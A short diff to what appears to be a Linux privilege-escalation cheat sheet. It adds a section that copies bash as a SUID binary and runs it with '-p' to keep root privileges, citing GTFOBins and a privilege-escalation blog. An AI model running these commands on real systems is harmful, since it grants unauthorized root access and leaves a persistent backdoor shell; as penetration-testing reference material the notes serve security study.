@@ -325,3 +325,24 @@ ls /tmp
 
 cd /opt && ls
 ```
+
+## Bash
+
+### SUID Binary
+
+```
+sudo install -m =xs $(which bash) .
+
+./bash -p
+```
+
+
+
+
+
+***
+
+## REFERENCES
+
+* [https://gtfobins.github.io/gtfobins/bash/#suid](https://gtfobins.github.io/gtfobins/bash/#suid)
+* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
